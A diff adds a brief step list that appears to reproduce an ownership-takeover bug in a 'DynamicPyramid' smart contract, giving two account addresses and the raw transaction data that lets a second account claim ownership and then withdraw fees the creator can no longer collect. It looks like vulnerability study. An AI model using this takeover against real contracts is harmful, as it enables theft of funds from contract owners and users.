@@ -1,0 +1,18 @@
+1.creator address:
+0x8a3c3b1535AA88Dd6698c6bb0A11A3be35b179a9
+
+2.account2 address:
+0x901Cb40e19debe219e2c5b00297B8501Cc18f44d
+
+send data(call DynamicPyramid() to change the owner):
+0x67f809e9
+
+3.creator address
+
+send data(call collectFeesInEther(), but not work, because the owner has changed to account2)
+0xb40229500000000000000000000000000000000000000000000000000000000000000001
+
+4.account2 address:
+send data(call collectFeesInEther(), worked)
+0xb40229500000000000000000000000000000000000000000000000000000000000000001
+
